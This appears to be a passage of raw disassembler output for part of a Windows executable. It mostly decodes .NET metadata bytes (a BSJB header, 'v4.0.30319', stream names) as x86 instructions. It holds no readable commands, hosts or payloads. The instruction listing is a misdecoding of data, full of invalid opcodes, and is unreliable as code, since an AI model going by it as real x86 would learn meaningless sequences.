  40644e:	38 b0 ee 31 50 d8    	cmp    %dh,-0x27afce12(%eax)
  406454:	0d 3b 4d 0e e5       	or     $0xe50e4d3b,%eax
  406459:	54                   	push   %esp
  40645a:	8f                   	(bad)
  40645b:	39 99 80 36 87 df    	cmp    %ebx,-0x2078c980(%ecx)
  406461:	15 88 65 2b 14       	adc    $0x142b6588,%eax
  406466:	e8 e7 6a 87 9f       	call   0x9fc7cf52
  40646b:	8f                   	(bad)
  40646c:	b2 0e                	mov    $0xe,%dl
  40646e:	9e                   	sahf
  40646f:	18 9d 2d e2 8f 56    	sbb    %bl,0x568fe22d(%ebp)
  406475:	91                   	xchg   %eax,%ecx
  406476:	65 9a ca 9e d3 52 26 	gs lcall $0x6c26,$0x52d39eca
  40647d:	6c 
  40647e:	8e 1b                	mov    (%ebx),%ds
  406480:	bf 5c 7a 43 8e       	mov    $0x8e437a5c,%edi
  406485:	44                   	inc    %esp
  406486:	eb 20                	jmp    0x4064a8
  406488:	48                   	dec    %eax
  406489:	0b d0                	or     %eax,%edx
  40648b:	5b                   	pop    %ebx
  40648c:	1a 51 5c             	sbb    0x5c(%ecx),%dl
  40648f:	dc 77 2a             	fdivl  0x2a(%edi)
  406492:	8c 4e 1d             	mov    %cs,0x1d(%esi)
  406495:	6c                   	insb   (%dx),%es:(%edi)
  406496:	31 5c f2 7e          	xor    %ebx,0x7e(%edx,%esi,8)
  40649a:	a1 59 b8 61 59       	mov    0x5961b859,%eax
  40649f:	a1 a5 c2 c8 aa       	mov    0xaac8c2a5,%eax
  4064a4:	58                   	pop    %eax
  4064a5:	e8 72 5a ed e1       	call   0xe22dbf1c
  4064aa:	5c                   	pop    %esp
  4064ab:	8d                   	lea    (bad),%ebx
  4064ac:	dd 3c c6             	fnstsw (%esi,%eax,8)
  4064af:	4a                   	dec    %edx
  4064b0:	8f 84 2a ef 72 76 ef 	pop    -0x10898d11(%edx,%ebp,1)
  4064b7:	23 15 bf 2f 07 47    	and    0x47072fbf,%edx
  4064bd:	ae                   	scas   %es:(%edi),%al
  4064be:	ba d9 f4 66 48       	mov    $0x4866f4d9,%edx
  4064c3:	94                   	xchg   %eax,%esp
  4064c4:	3a a0 17 39 4f 33    	cmp    0x334f3917(%eax),%ah
  4064ca:	ff c9                	dec    %ecx
  4064cc:	23 fe                	and    %esi,%edi
  4064ce:	0d ac e6 bd 4f       	or     $0x4fbde6ac,%eax
  4064d3:	5c                   	pop    %esp
  4064d4:	0a eb                	or     %bl,%ch
  4064d6:	f1                   	int1
  4064d7:	70 5e                	jo     0x406537
  4064d9:	db 16                	fistl  (%esi)
  4064db:	83 bc 16 ea 00 4c e9 	cmpl   $0xffffffd2,-0x16b3ff16(%esi,%edx,1)
  4064e2:	d2 
  4064e3:	ee                   	out    %al,(%dx)
  4064e4:	b6 7d                	mov    $0x7d,%dh
  4064e6:	35 97 da c1 66       	xor    $0x66c1da97,%eax
  4064eb:	87 8d b7 9d 15 63    	xchg   %ecx,0x63159db7(%ebp)
  4064f1:	3c 7d                	cmp    $0x7d,%al
  4064f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4064f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4064f5:	0b d3                	or     %ebx,%edx
  4064f7:	98                   	cwtl
  4064f8:	b7 f4                	mov    $0xf4,%bh
  4064fa:	d6                   	salc
  4064fb:	35 8d 92 6f c4       	xor    $0xc46f928d,%eax
  406500:	2b 86 4c 6a b8 6e    	sub    0x6eb86a4c(%esi),%eax
  406506:	6d                   	insl   (%dx),%es:(%edi)
  406507:	1f                   	pop    %ds
  406508:	64 2e 43             	fs cs inc %ebx
  40650b:	43                   	inc    %ebx
  40650c:	73 59                	jae    0x406567
  40650e:	f0 7e 63             	lock jle 0x406574
  406511:	92                   	xchg   %eax,%edx
  406512:	28 c1                	sub    %al,%cl
  406514:	92                   	xchg   %eax,%edx
  406515:	87 51 b7             	xchg   %edx,-0x49(%ecx)
  406518:	8d 79 18             	lea    0x18(%ecx),%edi
  40651b:	ac                   	lods   %ds:(%esi),%al
  40651c:	9d                   	popf
  40651d:	fb                   	sti
  40651e:	ec                   	in     (%dx),%al
  40651f:	f5                   	cmc
  406520:	4c                   	dec    %esp
  406521:	25 16 dc e5 ac       	and    $0xace5dc16,%eax
  406526:	31 1c 2f             	xor    %ebx,(%edi,%ebp,1)
  406529:	cd 8b                	int    $0x8b
  40652b:	5a                   	pop    %edx
  40652c:	1c 38                	sbb    $0x38,%al
  40652e:	ca 7d 55             	lret   $0x557d
  406531:	df 49 19             	fisttps 0x19(%ecx)
  406534:	ef                   	out    %eax,(%dx)
  406535:	9d                   	popf
  406536:	78 2d                	js     0x406565
  406538:	79 18                	jns    0x406552
  40653a:	0a b1 ce dd 51 80    	or     -0x7fae2232(%ecx),%dh
  406540:	74 1c                	je     0x40655e
  406542:	db a0 ef 9a c9 3c    	(bad) 0x3cc99aef(%eax)
  406548:	f5                   	cmc
  406549:	eb d1                	jmp    0x40651c
  40654b:	bb b4 1e 12 5d       	mov    $0x5d121eb4,%ebx
  406550:	61                   	popa
  406551:	e1 4b                	loope  0x40659e
  406553:	1e                   	push   %ds
  406554:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406555:	f3 8b 6d a0          	repz mov -0x60(%ebp),%ebp
  406559:	98                   	cwtl
  40655a:	df b6 d6 56 48 aa    	fbstp  -0x55b7a92a(%esi)
  406560:	92                   	xchg   %eax,%edx
  406561:	54                   	push   %esp
  406562:	9b                   	fwait
  406563:	75 c2                	jne    0x406527
  406565:	74 5a                	je     0x4065c1
  406567:	b9 d1 df ac 0d       	mov    $0xdacdfd1,%ecx
  40656c:	ee                   	out    %al,(%dx)
  40656d:	50                   	push   %eax
  40656e:	87 5e 16             	xchg   %ebx,0x16(%esi)
  406571:	ee                   	out    %al,(%dx)
  406572:	49                   	dec    %ecx
  406573:	e9 42 53 4a 42       	jmp    0x428ab8ba
  406578:	01 00                	add    %eax,(%eax)
  40657a:	01 00                	add    %eax,(%eax)
  40657c:	00 00                	add    %al,(%eax)
  40657e:	00 00                	add    %al,(%eax)
  406580:	0c 00                	or     $0x0,%al
  406582:	00 00                	add    %al,(%eax)
  406584:	76 34                	jbe    0x4065ba
  406586:	2e 30 2e             	xor    %ch,%cs:(%esi)
  406589:	33 30                	xor    (%eax),%esi
  40658b:	33 31                	xor    (%ecx),%esi
  40658d:	39 00                	cmp    %eax,(%eax)
  40658f:	00 00                	add    %al,(%eax)
  406591:	00 05 00 6c 00 00    	add    %al,0x6c00
  406597:	00 a8 05 00 00 23    	add    %ch,0x23000005(%eax)
  40659d:	7e 00                	jle    0x40659f
  40659f:	00 14 06             	add    %dl,(%esi,%eax,1)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	30 08                	xor    %cl,(%eax)
  4065a6:	00 00                	add    %al,(%eax)
  4065a8:	23 53 74             	and    0x74(%ebx),%edx
  4065ab:	72 69                	jb     0x406616
  4065ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4065ae:	67 73 00             	addr16 jae 0x4065b1
  4065b1:	00 00                	add    %al,(%eax)
  4065b3:	00 44 0e 00          	add    %al,0x0(%esi,%ecx,1)
  4065b7:	00 f8                	add    %bh,%al
  4065b9:	03 00                	add    (%eax),%eax
  4065bb:	00 23                	add    %ah,(%ebx)
  4065bd:	55                   	push   %ebp
  4065be:	53                   	push   %ebx
  4065bf:	00 3c 12             	add    %bh,(%edx,%edx,1)
  4065c2:	00 00                	add    %al,(%eax)
  4065c4:	10 00                	adc    %al,(%eax)
  4065c6:	00 00                	add    %al,(%eax)
  4065c8:	23 47 55             	and    0x55(%edi),%eax
  4065cb:	49                   	dec    %ecx
  4065cc:	44                   	inc    %esp
  4065cd:	00 00                	add    %al,(%eax)
  4065cf:	00 4c 12 00          	add    %cl,0x0(%edx,%edx,1)
  4065d3:	00 ec                	add    %ch,%ah
  4065d5:	02 00                	add    (%eax),%al
  4065d7:	00 23                	add    %ah,(%ebx)
  4065d9:	42                   	inc    %edx
  4065da:	6c                   	insb   (%dx),%es:(%edi)
  4065db:	6f                   	outsl  %ds:(%esi),(%dx)
  4065dc:	62 00                	bound  %eax,(%eax)
  4065de:	00 00                	add    %al,(%eax)
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	02 00                	add    (%eax),%al
  4065e6:	00 01                	add    %al,(%ecx)
  4065e8:	57                   	push   %edi
  4065e9:	55                   	push   %ebp
  4065ea:	02 14 09             	add    (%ecx,%ecx,1),%dl
  4065ed:	03 00                	add    (%eax),%eax
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	fa                   	cli
  4065f2:	25 33 00 16 00       	and    $0x160033,%eax
  4065f7:	00 01                	add    %al,(%ecx)
  4065f9:	00 00                	add    %al,(%eax)
  4065fb:	00 37                	add    %dh,(%edi)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 03                	add    %al,(%ebx)
  406601:	00 00                	add    %al,(%eax)
  406603:	00 02                	add    %al,(%edx)
  406605:	00 00                	add    %al,(%eax)
  406607:	00 0f                	add    %cl,(%edi)
  406609:	00 00                	add    %al,(%eax)
  40660b:	00 10                	add    %dl,(%eax)
  40660d:	00 00                	add    %al,(%eax)
  40660f:	00 4b 00             	add    %cl,0x0(%ebx)
  406612:	00 00                	add    %al,(%eax)
  406614:	04 00                	add    $0x0,%al
  406616:	00 00                	add    %al,(%eax)
  406618:	01 00                	add    %eax,(%eax)
  40661a:	00 00                	add    %al,(%eax)
  40661c:	07                   	pop    %es
  40661d:	00 00                	add    %al,(%eax)
  40661f:	00 01                	add    %al,(%ecx)
  406621:	00 00                	add    %al,(%eax)
  406623:	00 03                	add    %al,(%ebx)
  406625:	00 00                	add    %al,(%eax)
  406627:	00 01                	add    %al,(%ecx)
  406629:	00 00                	add    %al,(%eax)
  40662b:	00 05 00 00 00 01    	add    %al,0x1000000
  406631:	00 00                	add    %al,(%eax)
  406633:	00 01                	add    %al,(%ecx)
  406635:	00 00                	add    %al,(%eax)
  406637:	00 00                	add    %al,(%eax)
  406639:	00 0a                	add    %cl,(%edx)
  40663b:	00 01                	add    %al,(%ecx)
  40663d:	00 00                	add    %al,(%eax)
  40663f:	00 00                	add    %al,(%eax)
  406641:	00 06                	add    %al,(%esi)
  406643:	00 35 00 2e 00 06    	add    %dh,0x6002e00
  406649:	00 3f                	add    %bh,(%edi)
  40664b:	01 20                	add    %esp,(%eax)
  40664d:	01 06                	add    %eax,(%esi)
  40664f:	00 92 01 76 01 06    	add    %dl,0x6017601(%edx)
  406655:	00 ae 01 76 01 06    	add    %ch,0x6017601(%esi)
  40665b:	00 dd                	add    %bl,%ch
  40665d:	01 bd 01 06 00 fd    	add    %edi,-0x2fff9ff(%ebp)
  406663:	01 bd 01 06 00 26    	add    %edi,0x26000601(%ebp)
  406669:	02 20                	add    (%eax),%ah
  40666b:	01 0a                	add    %ecx,(%edx)
  40666d:	00 77 02             	add    %dh,0x2(%edi)
  406670:	64 02 06             	add    %fs:(%esi),%al
  406673:	00 9b 02 91 02 06    	add    %bl,0x6029102(%ebx)
  406679:	00 a0 02 91 02 06    	add    %ah,0x6029102(%eax)
  40667f:	00 c4                	add    %al,%ah
  406681:	02 2e                	add    (%esi),%ch
  406683:	00 06                	add    %al,(%esi)
  406685:	00 df                	add    %bl,%bh
  406687:	02 2e                	add    (%esi),%ch
  406689:	00 0e                	add    %cl,(%esi)
  40668b:	00 02                	add    %al,(%edx)
  40668d:	03 ed                	add    %ebp,%ebp
  40668f:	02 0e                	add    (%esi),%cl
  406691:	00 0d 03 ed 02 06    	add    %cl,0x602ed03
  406697:	00 36                	add    %dh,(%esi)
  406699:	03 2e                	add    (%esi),%ebp
  40669b:	00 06                	add    %al,(%esi)
  40669d:	00 46 03             	add    %al,0x3(%esi)
  4066a0:	2e 00 06             	add    %al,%cs:(%esi)
  4066a3:	00 4b 03             	add    %cl,0x3(%ebx)
  4066a6:	2e 00 06             	add    %al,%cs:(%esi)
  4066a9:	00 5f 03             	add    %bl,0x3(%edi)
  4066ac:	20 01                	and    %al,(%ecx)
  4066ae:	06                   	push   %es
  4066af:	00 7e 03             	add    %bh,0x3(%esi)
  4066b2:	6c                   	insb   (%dx),%es:(%edi)
  4066b3:	03 06                	add    (%esi),%eax
  4066b5:	00 fc                	add    %bh,%ah
  4066b7:	03 eb                	add    %ebx,%ebp
  4066b9:	03 06                	add    (%esi),%eax
  4066bb:	00 08                	add    %cl,(%eax)
  4066bd:	04 eb                	add    $0xeb,%al
  4066bf:	03 06                	add    (%esi),%eax
  4066c1:	00 0f                	add    %cl,(%edi)
  4066c3:	04 2e                	add    $0x2e,%al
  4066c5:	00 06                	add    %al,(%esi)
  4066c7:	00 28                	add    %ch,(%eax)
  4066c9:	04 2e                	add    $0x2e,%al
  4066cb:	00 06                	add    %al,(%esi)
  4066cd:	00 38                	add    %bh,(%eax)
  4066cf:	04 6c                	add    $0x6c,%al
  4066d1:	03 06                	add    (%esi),%eax
  4066d3:	00 52 04             	add    %dl,0x4(%edx)
  4066d6:	6c                   	insb   (%dx),%es:(%edi)
  4066d7:	03 06                	add    (%esi),%eax
  4066d9:	00 64 04 2e          	add    %ah,0x2e(%esp,%eax,1)
  4066dd:	00 06                	add    %al,(%esi)
  4066df:	00 6e 04             	add    %ch,0x4(%esi)
  4066e2:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  4066e6:	7a 04                	jp     0x4066ec
  4066e8:	00 00                	add    %al,(%eax)
  4066ea:	06                   	push   %es
  4066eb:	00 9f 04 91 02 06    	add    %bl,0x6029104(%edi)
  4066f1:	00 b0 04 91 02 06    	add    %dh,0x6029104(%eax)
  4066f7:	00 ce                	add    %cl,%dh
  4066f9:	04 2e                	add    $0x2e,%al
  4066fb:	00 06                	add    %al,(%esi)
  4066fd:	00 ec                	add    %ch,%ah
  4066ff:	04 91                	add    $0x91,%al
  406701:	02 06                	add    (%esi),%al
  406703:	00 05 05 2e 00 06    	add    %al,0x6002e05
  406709:	00 1d 05 2e 00 06    	add    %bl,0x6002e05
  40670f:	00 79 05             	add    %bh,0x5(%ecx)
  406712:	5f                   	pop    %edi
  406713:	05 06 00 94 05       	add    $0x5940006,%eax
  406718:	5f                   	pop    %edi
  406719:	05 06 00 a5 05       	add    $0x5a50006,%eax
  40671e:	5f                   	pop    %edi
  40671f:	05 12 00 db 05       	add    $0x5db0012,%eax
  406724:	c9                   	leave
  406725:	05 12 00 f4 05       	add    $0x5f40012,%eax
  40672a:	c9                   	leave
  40672b:	05 9f 00 13 06       	add    $0x613009f,%eax
  406730:	00 00                	add    %al,(%eax)
  406732:	12 00                	adc    (%eax),%al
  406734:	3c 06                	cmp    $0x6,%al
  406736:	c9                   	leave
  406737:	05 12 00 5d 06       	add    $0x65d0012,%eax
  40673c:	c9                   	leave
  40673d:	05 06 00 77 06       	add    $0x6770006,%eax
  406742:	2e 00 06             	add    %al,%cs:(%esi)
  406745:	00 96 06 2e 00 16    	add    %dl,0x16002e06(%esi)
  40674b:	00 d3                	add    %dl,%bl
  40674d:	06                   	push   %es
  40674e:	b6 06                	mov    $0x6,%dh
  406750:	06                   	push   %es
  406751:	00 de                	add    %bl,%dh
  406753:	06                   	push   %es
  406754:	b6 06                	mov    $0x6,%dh
  406756:	06                   	push   %es
  406757:	00 f1                	add    %dh,%cl
  406759:	06                   	push   %es
  40675a:	b6 06                	mov    $0x6,%dh
  40675c:	06                   	push   %es
  40675d:	00 05 07 b6 06 06    	add    %al,0x606b607
  406763:	00 1d 07 b6 06 06    	add    %bl,0x606b607
  406769:	00 52 07             	add    %dl,0x7(%edx)
  40676c:	91                   	xchg   %eax,%ecx
  40676d:	02 0a                	add    (%edx),%cl
  40676f:	00 75 07             	add    %dh,0x7(%ebp)
  406772:	5f                   	pop    %edi
  406773:	07                   	pop    %es
  406774:	06                   	push   %es
  406775:	00 80 07 91 02 0a    	add    %al,0xa029107(%eax)
  40677b:	00 87 07 5f 07 06    	add    %al,0x6075f07(%edi)
  406781:	00 c7                	add    %al,%bh
  406783:	07                   	pop    %es
  406784:	bd 01 06 00 f2       	mov    $0xf2000601,%ebp
  406789:	07                   	pop    %es
  40678a:	e2 07                	loop   0x406793
  40678c:	00 00                	add    %al,(%eax)
  40678e:	00 00                	add    %al,(%eax)
  406790:	01 00                	add    %eax,(%eax)
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	01 00                	add    %eax,(%eax)
  406798:	01 00                	add    %eax,(%eax)
  40679a:	00 00                	add    %al,(%eax)
  40679c:	10 00                	adc    %al,(%eax)
  40679e:	19 00                	sbb    %eax,(%eax)
  4067a0:	1f                   	pop    %ds
  4067a1:	00 05 00 01 00 01    	add    %al,0x1000100
  4067a7:	00 03                	add    %al,(%ebx)
  4067a9:	01 10                	add    %edx,(%eax)
  4067ab:	00 46 02             	add    %al,0x2(%esi)
  4067ae:	00 00                	add    %al,(%eax)
  4067b0:	05 00 02 00 0e       	add    $0xe000200,%eax
  4067b5:	00 11                	add    %dl,(%ecx)
  4067b7:	00 66 00             	add    %ah,0x0(%esi)
  4067ba:	1e                   	push   %ds
  4067bb:	00 06                	add    %al,(%esi)
  4067bd:	00 71 01             	add    %dh,0x1(%ecx)
  4067c0:	61                   	popa
  4067c1:	00 00                	add    %al,(%eax)
  4067c3:	00 00                	add    %al,(%eax)
  4067c5:	00 80 00 91 20 3c    	add    %al,0x3c209100(%eax)
  4067cb:	00 0a                	add    %cl,(%edx)
  4067cd:	00 01                	add    %al,(%ecx)
  4067cf:	00 00                	add    %al,(%eax)
  4067d1:	00 00                	add    %al,(%eax)
  4067d3:	00 80 00 91 20 48    	add    %al,0x48209100(%eax)
  4067d9:	00 0f                	add    %cl,(%edi)
  4067db:	00 02                	add    %al,(%edx)
  4067dd:	00 00                	add    %al,(%eax)
  4067df:	00 00                	add    %al,(%eax)
  4067e1:	00 80 00 91 20 57    	add    %al,0x57209100(%eax)
  4067e7:	00 15 00 04 00 88    	add    %dl,0x88000400
  4067ed:	20 00                	and    %al,(%eax)
  4067ef:	00 00                	add    %al,(%eax)
  4067f1:	00 91 00 7d 00 21    	add    %dl,0x21007d00(%ecx)
  4067f7:	00 08                	add    %cl,(%eax)
  4067f9:	00 f4                	add    %dh,%ah
  4067fb:	22 00                	and    (%eax),%al
  4067fd:	00 00                	add    %al,(%eax)
  4067ff:	00 91 00 82 00 27    	add    %dl,0x27008200(%ecx)
  406805:	00 09                	add    %cl,(%ecx)
  406807:	00 04 23             	add    %al,(%ebx,%eiz,1)
  40680a:	00 00                	add    %al,(%eax)
  40680c:	00 00                	add    %al,(%eax)
  40680e:	91                   	xchg   %eax,%ecx
  40680f:	00 8c 00 2c 00 0a 00 	add    %cl,0xa002c(%eax,%eax,1)
  406816:	04 24                	add    $0x24,%al
  406818:	00 00                	add    %al,(%eax)
  40681a:	00 00                	add    %al,(%eax)
  40681c:	91                   	xchg   %eax,%ecx
  40681d:	00 9b 00 31 00 0b    	add    %bl,0xb003100(%ebx)
  406823:	00 2c 24             	add    %ch,(%esp)
  406826:	00 00                	add    %al,(%eax)
  406828:	00 00                	add    %al,(%eax)
  40682a:	91                   	xchg   %eax,%ecx
  40682b:	00 a3 00 2c 00 0b    	add    %ah,0xb002c00(%ebx)
  406831:	00 18                	add    %bl,(%eax)
  406833:	25 00 00 00 00       	and    $0x0,%eax
  406838:	91                   	xchg   %eax,%ecx
  406839:	00 bf 00 35 00 0c    	add    %bh,0xc003500(%edi)
  40683f:	00 6c 25 00          	add    %ch,0x0(%ebp,%eiz,1)
  406843:	00 00                	add    %al,(%eax)
  406845:	00 91 00 c5 00 40    	add    %dl,0x4000c500(%ecx)
  40684b:	00 0f                	add    %cl,(%edi)
  40684d:	00 e8                	add    %ch,%al
  40684f:	25 00 00 00 00       	and    $0x0,%eax
  406854:	91                   	xchg   %eax,%ecx
  406855:	00 cb                	add    %cl,%bl
  406857:	00 47 00             	add    %al,0x0(%edi)
  40685a:	10 00                	adc    %al,(%eax)
  40685c:	55                   	push   %ebp
  40685d:	26 00 00             	add    %al,%es:(%eax)
  406860:	00 00                	add    %al,(%eax)
  406862:	86 18                	xchg   %bl,(%eax)
  406864:	d1 00                	roll   $1,(%eax)
  406866:	4d                   	dec    %ebp
  406867:	00 11                	add    %dl,(%ecx)
  406869:	00 4c 26 00          	add    %cl,0x0(%esi,%eiz,1)
  40686d:	00 00                	add    %al,(%eax)
  40686f:	00 91 18 c0 07 3a    	add    %dl,0x3a07c018(%ecx)
  406875:	01 11                	add    %edx,(%ecx)
  406877:	00 50 20             	add    %dl,0x20(%eax)
  40687a:	00 00                	add    %al,(%eax)
  40687c:	00 00                	add    %al,(%eax)
  40687e:	86 18                	xchg   %bl,(%eax)
  406880:	d1 00                	roll   $1,(%eax)
  406882:	4d                   	dec    %ebp
  406883:	00 11                	add    %dl,(%ecx)
  406885:	00 58 20             	add    %bl,0x20(%eax)
  406888:	00 00                	add    %al,(%eax)
  40688a:	00 00                	add    %al,(%eax)
  40688c:	86 00                	xchg   %al,(%eax)
  40688e:	59                   	pop    %ecx
  40688f:	02 4d 00             	add    0x0(%ebp),%cl
  406892:	11 00                	adc    %eax,(%eax)
  406894:	00 00                	add    %al,(%eax)
  406896:	01 00                	add    %eax,(%eax)
  406898:	d7                   	xlat   %ds:(%ebx)
  406899:	00 00                	add    %al,(%eax)
  40689b:	00 01                	add    %al,(%ecx)
  40689d:	00 e2                	add    %ah,%dl
  40689f:	00 00                	add    %al,(%eax)
  4068a1:	00 02                	add    %al,(%edx)
  4068a3:	00 ea                	add    %ch,%dl
  4068a5:	00 00                	add    %al,(%eax)
  4068a7:	00 01                	add    %al,(%ecx)
  4068a9:	00 f3                	add    %dh,%bl
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 02                	add    %al,(%edx)
  4068af:	00 fd                	add    %bh,%ch
  4068b1:	00 00                	add    %al,(%eax)
  4068b3:	00 03                	add    %al,(%ebx)
  4068b5:	00 04 01             	add    %al,(%ecx,%eax,1)
  4068b8:	02 00                	add    (%eax),%al
  4068ba:	04 00                	add    $0x0,%al
  4068bc:	11 01                	adc    %eax,(%ecx)
  4068be:	00 00                	add    %al,(%eax)
  4068c0:	01 00                	add    %eax,(%eax)
  4068c2:	4c                   	dec    %esp
  4068c3:	01 00                	add    %eax,(%eax)
  4068c5:	00 01                	add    %al,(%ecx)
  4068c7:	00 51 01             	add    %dl,0x1(%ecx)
  4068ca:	00 00                	add    %al,(%eax)
  4068cc:	01 00                	add    %eax,(%eax)
  4068ce:	56                   	push   %esi
  4068cf:	01 00                	add    %eax,(%eax)
  4068d1:	00 01                	add    %al,(%ecx)
  4068d3:	00 56 01             	add    %dl,0x1(%esi)
  4068d6:	00 00                	add    %al,(%eax)
  4068d8:	01 00                	add    %eax,(%eax)
  4068da:	5e                   	pop    %esi
  4068db:	01 00                	add    %eax,(%eax)
  4068dd:	00 02                	add    %al,(%edx)
  4068df:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
  4068e3:	00 03                	add    %al,(%ebx)
  4068e5:	00 68 01             	add    %ch,0x1(%eax)
  4068e8:	00 00                	add    %al,(%eax)
  4068ea:	01 00                	add    %eax,(%eax)
  4068ec:	6b 01 00             	imul   $0x0,(%ecx),%eax
  4068ef:	00 01                	add    %al,(%ecx)
  4068f1:	00 71 01             	add    %dh,0x1(%ecx)
  4068f4:	11 00                	adc    %eax,(%eax)
  4068f6:	d1 00                	roll   $1,(%eax)
  4068f8:	4d                   	dec    %ebp
  4068f9:	00 19                	add    %bl,(%ecx)
  4068fb:	00 d1                	add    %dl,%cl
  4068fd:	00 51 00             	add    %dl,0x0(%ecx)
  406900:	29 00                	sub    %eax,(%eax)
  406902:	d1 00                	roll   $1,(%eax)
  406904:	57                   	push   %edi
  406905:	00 31                	add    %dh,(%ecx)
  406907:	00 d1                	add    %dl,%cl
  406909:	00 4d 00             	add    %cl,0x0(%ebp)
  40690c:	39 00                	cmp    %eax,(%eax)
  40690e:	d1 00                	roll   $1,(%eax)
  406910:	5c                   	pop    %esp
  406911:	00 09                	add    %cl,(%ecx)
  406913:	00 d1                	add    %dl,%cl
  406915:	00 4d 00             	add    %cl,0x0(%ebp)
  406918:	41                   	inc    %ecx
  406919:	00 7f 02             	add    %bh,0x2(%edi)
  40691c:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  406920:	85 02                	test   %eax,(%edx)
  406922:	4d                   	dec    %ebp
  406923:	00 49 00             	add    %cl,0x0(%ecx)
  406926:	af                   	scas   %es:(%edi),%eax
  406927:	02 6a 00             	add    0x0(%edx),%ch
  40692a:	49                   	dec    %ecx
  40692b:	00 bd 02 2c 00 59    	add    %bh,0x59002c02(%ebp)
  406931:	00 cc                	add    %cl,%ah
  406933:	02 71 00             	add    0x0(%ecx),%dh
  406936:	09 00                	or     %eax,(%eax)
  406938:	d6                   	salc
  406939:	02 75 00             	add    0x0(%ebp),%dh
  40693c:	61                   	popa
  40693d:	00 e6                	add    %ah,%dh
  40693f:	02 79 00             	add    0x0(%ecx),%bh
  406942:	69 00 1a 03 7f 00    	imul   $0x7f031a,(%eax),%eax
  406948:	41                   	inc    %ecx
  406949:	00 1f                	add    %bl,(%edi)
  40694b:	03 85 00 41 00 31    	add    0x31004100(%ebp),%eax
  406951:	03 4d 00             	add    0x0(%ebp),%ecx
  406954:	79 00                	jns    0x406956
  406956:	3d 03 8a 00 89       	cmp    $0x89008a03,%eax
  40695b:	00 53 03             	add    %dl,0x3(%ebx)
  40695e:	8e 00                	mov    (%eax),%es
  406960:	91                   	xchg   %eax,%ecx
  406961:	00 67 03             	add    %ah,0x3(%edi)
  406964:	93                   	xchg   %eax,%ebx
  406965:	00 99 00 87 03 9c    	add    %bl,-0x63fc7900(%ecx)
  40696b:	00 99 00 9c 03 a1    	add    %bl,-0x5efc6400(%ecx)
  406971:	00 61 00             	add    %ah,0x0(%ecx)
  406974:	b5 03                	mov    $0x3,%ch
  406976:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406977:	00 61 00             	add    %ah,0x0(%ecx)
  40697a:	c1 03 27             	roll   $0x27,(%ebx)
  40697d:	00 61 00             	add    %ah,0x0(%ecx)
  406980:	d4 03                	aam    $0x3
  406982:	ac                   	lods   %ds:(%esi),%al
  406983:	00 49 00             	add    %cl,0x0(%ecx)
  406986:	dd 03                	fldl   (%ebx)
  406988:	b1 00                	mov    $0x0,%cl
  40698a:	a1 00 d1 00 b8       	mov    0xb800d100,%eax
  40698f:	00 a9 00 d1 00 be    	add    %ch,-0x41ff2f00(%ecx)
  406995:	00 a9 00 7f 02 4d    	add    %ch,0x4d027f00(%ecx)
  40699b:	00 b1 00 17 04 47    	add    %dh,0x47041700(%ecx)
  4069a1:	00 61 00             	add    %ah,0x0(%ecx)
  4069a4:	2d 04 c4 00 99       	sub    $0x9900c404,%eax
  4069a9:	00 33                	add    %dh,(%ebx)
  4069ab:	04 cb                	add    $0xcb,%al
  4069ad:	00 99 00 43 04 d2    	add    %bl,-0x2dfbbd00(%ecx)
  4069b3:	00 c9                	add    %cl,%cl
  4069b5:	00 5d 04             	add    %bl,0x4(%ebp)
  4069b8:	d7                   	xlat   %ds:(%ebx)
  4069b9:	00 d9                	add    %bl,%cl
  4069bb:	00 88 04 01 01 61    	add    %cl,0x61010104(%eax)
  4069c1:	00 96 04 ac 00 e9    	add    %dl,-0x16ff53fc(%esi)
  4069c7:	00 a9 04 27 00 e9    	add    %ch,-0x16ffd8fc(%ecx)
  4069cd:	00 be 04 07 01 f9    	add    %bh,-0x6fef8fc(%esi)
  4069d3:	00 d3                	add    %dl,%bl
  4069d5:	04 0d                	add    $0xd,%al
  4069d7:	01 61 00             	add    %esp,0x0(%ecx)
  4069da:	db 04 12             	fildl  (%edx,%edx,1)
  4069dd:	01 61 00             	add    %esp,0x0(%ecx)
  4069e0:	e5 04                	in     $0x4,%eax
  4069e2:	18 01                	sbb    %al,(%ecx)
  4069e4:	01 01                	add    %eax,(%ecx)
  4069e6:	f1                   	int1
  4069e7:	04 79                	add    $0x79,%al
  4069e9:	00 01                	add    %al,(%ecx)
  4069eb:	01 f9                	add    %edi,%ecx
  4069ed:	04 1e                	add    $0x1e,%al
  4069ef:	01 61 00             	add    %esp,0x0(%ecx)
  4069f2:	16                   	push   %ss
  4069f3:	05 23 01 49 00       	add    $0x490123,%eax
  4069f8:	67 03 2c             	add    (%si),%ebp
  4069fb:	01 59 00             	add    %ebx,0x0(%ecx)
  4069fe:	2a 05 33 01 59 00    	sub    0x590133,%al
  406a04:	3e 05 2c 00 59 00    	ds add $0x59002c,%eax
  406a0a:	48                   	dec    %eax
  406a0b:	05 3a 01 d1 00       	add    $0xd1013a,%eax
  406a10:	53                   	push   %ebx
  406a11:	05 75 00 19 01       	add    $0x1190075,%eax
  406a16:	89 05 48 01 21 01    	mov    %eax,0x1210148
  406a1c:	d1 00                	roll   $1,(%eax)
  406a1e:	4e                   	dec    %esi
  406a1f:	01 21                	add    %esp,(%ecx)
  406a21:	01 b8 05 55 01 61    	add    %edi,0x61015505(%eax)
  406a27:	00 c1                	add    %al,%cl
  406a29:	05 65 01 61 00       	add    $0x610165,%eax
  406a2e:	e6 02                	out    %al,$0x2
  406a30:	6b 01 31             	imul   $0x31,(%ecx),%eax
  406a33:	01 d1                	add    %edx,%ecx
  406a35:	00 5c 00 31          	add    %bl,0x31(%eax,%eax,1)
  406a39:	01 0f                	add    %ecx,(%edi)
  406a3b:	06                   	push   %es
  406a3c:	7b 01                	jnp    0x406a3f
  406a3e:	39 01                	cmp    %eax,(%ecx)
  406a40:	2e 06                	cs push %es
